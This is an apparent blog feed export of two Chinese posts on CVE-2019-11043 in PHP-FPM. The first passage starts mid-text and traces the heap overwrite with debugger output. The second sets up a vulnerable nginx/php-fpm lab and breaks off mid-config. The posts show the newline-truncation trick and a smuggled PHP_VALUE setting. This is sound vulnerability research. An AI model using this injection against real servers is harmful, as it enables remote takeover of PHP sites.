class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p request.env.buckets.data[28]</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = &#123;</span></span><br><span class="line">  hash_value = 1679, </span><br><span class="line">  var_len = 15, </span><br><span class="line">  var = 0x558272727bb0 "PATH_TRANSLATED", </span><br><span class="line">  val_len = 19, </span><br><span class="line">  val = 0x558272727bc0 "/var/www/htmlB&#123;rr\202U", </span><br><span class="line">  next = 0x0, </span><br><span class="line">  list_next = 0x5582727256b0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p pt</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = 0x7fca08c02000 <span class="string">"/var/www/html/index.php"</span></span></span><br></pre></td></tr></table></figure></li><li><code>len</code>：即<code>pt</code>处理过程的中间变量变量<code>script_path_translated</code>的strlen，其值为<code>/var/www/html/index.php/PHP_VALUE\nsession.auto_start=1;;;</code>；那么显而易见变量<code>slen</code>：即<code>/PHP_VALUE\nsession.auto_start=1;;;</code>的长度，且<strong>攻击者可控</strong>。</li><li><code>env_path_info</code>：同1，<code>char *env_path_info = FCGI_GETENV(request, &quot;PATH_INFO&quot;);</code>。<blockquote><p>这里是漏洞关键点之一，<a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">发现者提供的信息</a>来看，我们使用<code>%0A</code>这个换行符截断时，会导致”PATH_INFO”置为空值。即<code>env_path_info</code>-&gt;””，不为空，指向值为空。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p env_path_info</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = 0x558272727a02 <span class="string">""</span></span></span><br></pre></td></tr></table></figure></li><li>跟进到line 1212：<code>path_info = env_path_info ? env_path_info + pilen - slen : NULL;</code>，稍微分析一下，现在<code>pilen</code>为0，<code>slen</code>可控，<code>env_path_info</code>不为空，<strong>那么我们便可控制<code>path_info</code>指针指向任意地址</strong>。修复commit：<code>path_info = env_path_info ? env_path_info + pilen - slen : NULL;</code>解决了该问题。</li></ol><ul><li>至此，我们操控了path_info指向特定地址，那么它到底被指向何处了呢？我们可以发现它被指向了<code>request-&gt;env-&gt;data-&gt;pos</code>指针变量的存储地址:<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p path_info</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5582727279e0 <span class="string">"B&#123;rr\202U"</span></span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> telescope path_info 1</span></span><br><span class="line">00:0000│   0x5582727279e0 —▸ 0x558272727b42 ◂— 0x4f00558272727b42</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p request-&gt;env-&gt;data-&gt;pos</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = 0x558272727b42 <span class="string">"B&#123;rr\202U"</span></span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p &amp;request-&gt;env-&gt;data-&gt;pos</span></span><br><span class="line"><span class="meta">$</span><span class="bash">3 = (char **) 0x5582727279e0</span></span><br></pre></td></tr></table></figure><br/></li></ul><h2 id="Control-configuration"><a href="#Control-configuration" class="headerlink" title="Control configuration"></a>Control configuration</h2><p>视线下移到<a href="https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1222" target="_blank" rel="noopener">init_request_info() line 1222</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_info[<span class="number">0</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><ul><li>这里，<code>path_info[0]</code>被置0，我们知道现在<code>path_info</code>是我们控制指向了<code>&amp;request-&gt;env-&gt;data-&gt;pos</code>，那么该行执行后，<code>request-&gt;env-&gt;data-&gt;pos</code>会转而指向后两位置0地址：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> before</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> telescope request-&gt;env-&gt;data-&gt;pos 1</span></span><br><span class="line">00:0000│   0x558272727b42 ◂— 0x4f00558272727b42</span><br><span class="line"><span class="meta">#</span><span class="bash"> after</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> telescope request-&gt;env-&gt;data-&gt;pos 1</span></span><br><span class="line">00:0000│   0x558272727b00 ◂— '==========================D'</span><br></pre></td></tr></table></figure>可见，它被“安排”到了我们添加的请求头<code>D_PISOS</code>&amp;<code>HTTP_EBUT</code>所形成的“堆陷阱”中，接下来只要通过某步往下覆盖，便会在不影响其它正常堆值情况下添加恶意的内容。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20s 0x558272727b00-0x61</span></span><br><span class="line">0x558272727a9f:"8", '=' &lt;repeats 122 times&gt;, "D"</span><br><span class="line">0x558272727b1c:"HTTP_EBUT"</span><br><span class="line">0x558272727b26:"mamku tvoyu"</span><br><span class="line">0x558272727b32:"ORIG_PATH_INFO"</span><br><span class="line">0x558272727b41:""</span><br><span class="line">0x558272727b42:"B&#123;rr\202U"</span><br><span class="line">0x558272727b49:"ORIG_SCRIPT_FILENAME"</span><br><span class="line">0x558272727b5e:"/var/www/html/index.php/PHP_VALUE\nsession.auto_start=0;;;"</span><br><span class="line">0x558272727b98:"/var/www/html/index.php"</span><br><span class="line">0x558272727bb0:"PATH_TRANSLATED"</span><br><span class="line">0x558272727bc0:"/var/www/htmlB&#123;rr\202U"</span><br><span class="line">0x558272727bd4:"/PHP_VALUE\nsession.auto_start=1;;;"</span><br><span class="line">0x558272727bf7:""</span><br><span class="line">0x558272727bf8:"E"</span><br><span class="line">0x558272727bfa:"ORIG_SCRIPT_FILENAME"</span><br><span class="line">0x558272727c0f:"/var/www/html/index.php/PHP_VALUE\nsession.auto_start=1;;;"</span><br><span class="line">0x558272727c49:"/var/www/html/index.php"</span><br><span class="line">0x558272727c61:"PATH_TRANSLATED"</span><br><span class="line">0x558272727c71:"/var/www/htmlE"</span><br><span class="line">0x558272727c80:"=====D"</span><br></pre></td></tr></table></figure>值得一提的是，<code>request-&gt;env-&gt;buckets-&gt;data</code>中各struct的<code>var</code>&amp;<code>val</code>都是指向堆中相应位置，那么在修改相应位置值后，也相当于控制了<code>request-&gt;env-&gt;buckets-&gt;data</code>的内容：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p request-&gt;env-&gt;buckets-&gt;data[24]</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = &#123;</span></span><br><span class="line">  hash_value = 2025, </span><br><span class="line">  var_len = 9, </span><br><span class="line">  var = 0x558272727b1c "HTTP_EBUT", </span><br><span class="line">  val_len = 11, </span><br><span class="line">  val = 0x558272727b26 "mamku tvoyu", </span><br><span class="line">  next = 0x5582727253b0, </span><br><span class="line">  list_next = 0x5582727255f0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p request-&gt;env-&gt;buckets-&gt;data[23]</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = &#123;</span></span><br><span class="line">  hash_value = 1928, </span><br><span class="line">  var_len = 12, </span><br><span class="line">  var = 0x558272727a92 "HTTP_D_PISOS", </span><br><span class="line">  val_len = 124, </span><br><span class="line">  val = 0x558272727a9f "8", '=' &lt;repeats 122 times&gt;, "D", </span><br><span class="line">  next = 0x0, </span><br><span class="line">  list_next = 0x5582727255c0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>继续跟进到<a href="https://github.com/php/php-src/blob/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d/sapi/fpm/fpm/fpm_main.c#L1226" target="_blank" rel="noopener">line 1226</a>，内存中堆值被覆盖发生在这，我们先来看<code>orig_script_name</code>值：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p orig_script_name</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = 0x558272727124 <span class="string">"/index.php/PHP_VALUE\nsession.auto_start=1;;;"</span></span></span><br></pre></td></tr></table></figure>其中包含了我们将要写的配置：<code>PHP_VALUE session.auto_start=1</code>，它会导致响应头中自动带有phpsessionid，用于验证漏洞可用。好，我们跟入<code>FCGI_PUTENV</code>，研究其实现：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># main/fastcgi.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_PUTENV(request, name, value) \</span></span><br><span class="line">fcgi_quick_putenv(request, name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>, FCGI_HASH_FUNC(name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>), value)</span><br></pre></td></tr></table></figure></li></ul><p>-&gt;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># main/fastcgi.c</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fcgi_quick_putenv</span><span class="params">(fcgi_request *req, <span class="keyword">char</span>* var, <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span>* val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (val == <span class="literal">NULL</span>) &#123;</span><br><span class="line"># ...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fcgi_hash_set(&amp;req-&gt;env, hash_value, var, var_len, val, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(val));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>-&gt;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># main/fastcgi.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_set</span><span class="params">(fcgi_hash *h, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span> *var, <span class="keyword">unsigned</span> <span class="keyword">int</span> var_len, <span class="keyword">char</span> *val, <span class="keyword">unsigned</span> <span class="keyword">int</span> val_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"># ...</span><br><span class="line">p-&gt;var = fcgi_hash_strndup(h, var, var_len);</span><br><span class="line">p-&gt;val_len = val_len;</span><br><span class="line">p-&gt;val = fcgi_hash_strndup(h, val, val_len);</span><br><span class="line"><span class="keyword">return</span> p-&gt;val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>-&gt;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># main/fastcgi.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_strndup</span><span class="params">(fcgi_hash *h, <span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> str_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UNEXPECTED(h-&gt;data-&gt;pos + str_len + <span class="number">1</span> &gt;= h-&gt;data-&gt;<span class="built_in">end</span>)) &#123;</span><br><span class="line"># ...</span><br><span class="line">&#125;</span><br><span class="line">ret = h-&gt;data-&gt;pos;</span><br><span class="line"><span class="built_in">memcpy</span>(ret, str, str_len);</span><br><span class="line">ret[str_len] = <span class="number">0</span>;</span><br><span class="line">h-&gt;data-&gt;pos += str_len + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们终于在最后找到为什么前面要费尽千辛万苦来控制<code>h-&gt;data-&gt;pos</code>，在<code>fcgi_hash_strndup()</code>函数中会将<code>str</code>拷贝至<code>h-&gt;data-&gt;pos</code>地址，并将其移位。而现在我们的str分别是<code>ORIG_SCRIPT_NAME</code>&amp;<code>/index.php/PHP_VALUE\nsession.auto_start=1;;;</code>，<code>fcgi_hash_strndup()</code>函数会将其依次覆盖到堆中，详见下方调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> before cover</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p h-&gt;buckets-&gt;data[24]</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1 = &#123;</span></span><br><span class="line">  hash_value = 2025, </span><br><span class="line">  var_len = 9, </span><br><span class="line">  var = 0x558272727b1c "HTTP_EBUT", </span><br><span class="line">  val_len = 11, </span><br><span class="line">  val = 0x558272727b26 "mamku tvoyu", </span><br><span class="line">  next = 0x5582727253b0, </span><br><span class="line">  list_next = 0x5582727255f0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> fcgi_hash_strndup(h, var, var_len) first time</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p str</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 = 0x55827056174a <span class="string">"ORIG_SCRIPT_NAME"</span></span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p ret</span></span><br><span class="line"><span class="meta">$</span><span class="bash">3 = 0x558272727b00 <span class="string">'='</span> &lt;repeats 26 <span class="built_in">times</span>&gt;, <span class="string">"D"</span></span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /1s 0x558272727b00</span></span><br><span class="line">0x558272727b00:'=' &lt;repeats 26 times&gt;, "D"</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> n</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /1s 0x558272727b00</span></span><br><span class="line">0x558272727b00:"ORIG_SCRIPT_NAME==========D"</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p h-&gt;data-&gt;pos</span></span><br><span class="line"><span class="meta">$</span><span class="bash">4 = 0x558272727b11 <span class="string">"=========D"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> fcgi_hash_strndup(h, var, var_len) second time</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p str</span></span><br><span class="line"><span class="meta">$</span><span class="bash">5 = 0x558272727124 <span class="string">"/index.php/PHP_VALUE\nsession.auto_start=1;;;"</span></span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p ret</span></span><br><span class="line"><span class="meta">$</span><span class="bash">6 = 0x558272727b11 <span class="string">"=========D"</span></span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> n</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /1s 0x558272727b11</span></span><br><span class="line">0x558272727b11:"/index.php/PHP_VALUE\nsession.auto_start=1;;;NFO"</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p h-&gt;data-&gt;pos</span></span><br><span class="line"><span class="meta">$</span><span class="bash">8 = 0x558272727b3e <span class="string">"FO"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> after cover</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> p h-&gt;buckets-&gt;data[24]</span></span><br><span class="line"><span class="meta">$</span><span class="bash">9 = &#123;</span></span><br><span class="line">  hash_value = 2025, </span><br><span class="line">  var_len = 9, </span><br><span class="line">  var = 0x558272727b1c "PHP_VALUE\nsession.auto_start=1;;;", </span><br><span class="line">  val_len = 11, </span><br><span class="line">  val = 0x558272727b26 "session.auto_start=1;;;", </span><br><span class="line">  next = 0x5582727253b0, </span><br><span class="line">  list_next = 0x5582727255f0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，被巧妙重写了原<code>HTTP_EBUT</code>所在的struct，还有些细节，比如<code>var_len=9</code>，那么在该配置被取出来的时候，<code>var</code>是等于<code>PHP_VALUE</code>，而非gdb错误显示的<code>PHP_VALUE\nsession.auto_start=1;;;</code>；比如加上<code>ORIG_SCRIPT_NAME</code>长度后,<code>PHP_VALUE...</code>被精确推到<code>0x558272727b1c</code>等等。<br><br/></p><h1 id="Afterword"><a href="#Afterword" class="headerlink" title="Afterword."></a>Afterword.</h1><p>核心漏洞分析如文中所示，当然其实还少了一部分，struct被重写后配置又是如何被实时解析成为nginx&amp;fastcgi通信时的全局变量呢？其实堆上，比如文中<code>0x558272727b1c</code>附近的值即是全局变量存储地址，你可以通过<code>phpinfo()</code>查看配置变化。但是污染的仅仅是处理此次请求的php-fpm子进程，所以利用成功后，若服务器配置了多个worker，我们需要可能需要经过多次请求来访问到已被污染的work进程。自然的，随着堆被回收，攻击也就失效。<br>至于更加深入分析限于篇幅就不展开讨论，读者可以自行探索或者通过邮箱/微博跟我交流讨论。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/php/php-src/tree/fadd7f0f1e7a44d6209b5c5cf30870e4b73efa7d" target="_blank" rel="noopener">php src before commit</a></li><li><a href="https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227" target="_blank" rel="noopener">patch commit</a></li><li><a href="https://lorexxar.cn/2019/10/25/php-fpm-rce/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">土土bolg</a></li><li><a href="(http://www.rai4over.cn/2019/10/25/php-fpm-Remote-Code-Execution-%E5%88%86%E6%9E%90-CVE-2019-11043/">FaIth4444 blog</a><a href="https://zsxq.tricking.io/topic/1011/" target="_blank" rel="noopener">from phith0n’s zsxq</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;The-foregoing&quot;&gt;&lt;a href=&quot;#The-foregoing&quot; class=&quot;headerlink&quot; title=&quot;The foregoing.&quot;&gt;&lt;/a&gt;The foregoing.&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;请先浏览该CVE复现与exp解析篇。
      
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://hducaiji.github.io/tags/CVE/"/>
    
      <category term="PHP" scheme="http://hducaiji.github.io/tags/PHP/"/>
    
      <category term="PWN" scheme="http://hducaiji.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-11043 PHP-FPM RCE - Vulnerability &amp; Emersion</title>
    <link href="http://hducaiji.github.io/2019/12/05/CVE-2019-11043/"/>
    <id>http://hducaiji.github.io/2019/12/05/CVE-2019-11043/</id>
    <published>2019-12-05T03:07:51.000Z</published>
    <updated>2020-07-28T07:17:05.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-foregoing"><a href="#The-foregoing" class="headerlink" title="The foregoing."></a>The foregoing.</h1><p>该CVE的来源很有趣，外国安研Andrew Danau做CTF题目时在URL添加0a截断，服务器响应异常，（开始以为题目利用点在此，）随后发现疑似服务器存在漏洞。随着安研们的研究，可知是php-fpm导致的问题，且若参照不当的NGINX配置(Nginx+phpfpm环境)，该CVE可被利用成RCE级的漏洞。<br>本文内容关于漏洞复现以及EXP简短分析，漏洞分析详见<a href="https://hducaiji.github.io/2019/12/06/CVE-2019-11043-2/">我的另一篇文章</a>。<br><br/></p><h1 id="Build-Env"><a href="#Build-Env" class="headerlink" title="Build Env"></a>Build Env</h1><h2 id="0x01-Using-Docker"><a href="#0x01-Using-Docker" class="headerlink" title="0x01 Using Docker"></a>0x01 Using Docker</h2><p>使用phith0n的<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub</a>最为简洁明快：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Download the latest version of the vulhub </span></span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  </span><br><span class="line"><span class="meta">#</span><span class="bash"> Entry vulnerability directory </span></span><br><span class="line">cd vulhub/php/CVE-2019-11043/</span><br><span class="line"><span class="meta">#</span><span class="bash"> Compile (optional) </span></span><br><span class="line">docker-compose build </span><br><span class="line"><span class="meta">#</span><span class="bash"> Run </span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><code>curl http://{your-ip}:8080/index.php</code>显示<code>helloworld%</code>即配置环境成功。<br>当然，也可以选择CVE提交者neex提供的<a href="https://github.com/neex/phuip-fpizdam#using-docker" target="_blank" rel="noopener">docker</a></p><h2 id="0x02-Build-by-yourself"><a href="#0x02-Build-by-yourself" class="headerlink" title="0x02 Build by yourself"></a>0x02 Build by yourself</h2><p>对于想要做漏洞分析，使用gdb调试的各位，<strong>可能</strong>搭建虚拟机调试环境会更加舒服。我这里选择Ubuntu 19.10，参照phith0n的<code>docker-compose.yml</code>搭建虚拟机漏洞环境：</p><ul><li>ref: <a href="https://www.howtoforge.com/tutorial/how-to-install-php-7-on-debian/" target="_blank" rel="noopener">How to install PHP 7.1, 7.2 and 5.6 as PHP-FPM &amp; FastCGI for ISPConfig 3 on Debian 9</a></li></ul><ol><li><strong>install <a href="mailto:&#x50;&#72;&#80;&#64;&#x37;&#46;&#50;&#x2e;&#49;&#48;">&#x50;&#72;&#80;&#64;&#x37;&#46;&#50;&#x2e;&#49;&#48;</a></strong><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libfcgi-dev libfcgi0ldbl libmcrypt-dev libssl-dev libc-client2007e libc-client2007e-dev libxml2-dev libbz2-dev libcurl4-openssl-dev libjpeg-dev libpng-dev libfreetype6-dev libkrb5-dev libpq-dev libxml2-dev libxslt1-dev</span><br><span class="line"></span><br><span class="line">wget http://de2.php.net/get/php-7.2.10.tar.bz2/from/this/mirror -O php-7.2.10.tar.bz2</span><br><span class="line">./configure --prefix=/opt/php7.2.10 --enable-phpdbg-debug --enable-debug --enable-fpm CFLAGS="-g3 -gdwarf-4"</span><br><span class="line">make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></li><li><strong>conf PHP-FPM</strong><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo cp php.ini-development /opt/php7.2.10/etc/php.ini &amp;&amp; cd /opt/php7.2.10</span><br><span class="line">sudo cp etc/php-fpm.conf.default /etc/php-fpm.conf</span><br><span class="line">sudo cp etc/php-fpm.d/www.conf.default etc/php-fpm.d/www.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> 为了便于研究，pm设为静态（子进程的数量由 pm.max_children 决定），并将pm.max_children设为1</span></span><br><span class="line">sudo vim etc/php-fpm.d/www.conf</span><br></pre></td></tr></table></figure></li></ol><p>-&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[www]</span><br><span class="line">pm &#x3D; static </span><br><span class="line">pm.max_children &#x3D; 1</span><br><span class="line">pm.start_servers &#x3D; 1</span><br><span class="line">pm.min_spare_servers &#x3D; 1</span><br><span class="line">pm.max_spare_servers &#x3D; 1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd sbin &amp;&amp; sudo ./php-fpm -c ../etc/php.ini -y ../etc/php-fpm.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> 测试php-fpm是否启动</span></span><br><span class="line">ps -ef | grep php-fpm</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>install&amp;conf Nginx</strong><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get intall nginx </span><br><span class="line">vi /etc/nginx/conf.d/default.conf</span><br></pre></td></tr></table></figure></li></ol><p>-&gt;</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span> default_server;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">index</span> index.html index.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span 